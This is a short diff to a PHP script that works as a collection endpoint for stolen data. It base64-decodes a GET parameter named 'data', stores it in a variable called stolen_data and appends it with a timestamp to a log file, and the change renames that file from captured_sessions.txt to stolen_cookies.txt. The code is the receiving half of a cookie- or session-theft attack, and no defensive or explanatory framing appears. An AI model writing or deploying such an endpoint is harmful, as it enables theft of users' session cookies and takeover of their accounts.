@@ -2,7 +2,7 @@
 // Data collection logic
 if (isset($_GET['data'])) {
     $stolen_data = base64_decode($_GET['data']);
-    $file = fopen("captured_sessions.txt", "a");
+    $file = fopen("stolen_cookies.txt", "a");
     fwrite($file, "Time: " . date("Y-m-d H:i:s") . " | Data: " . $stolen_data . "\n");
     fclose($file);
 }
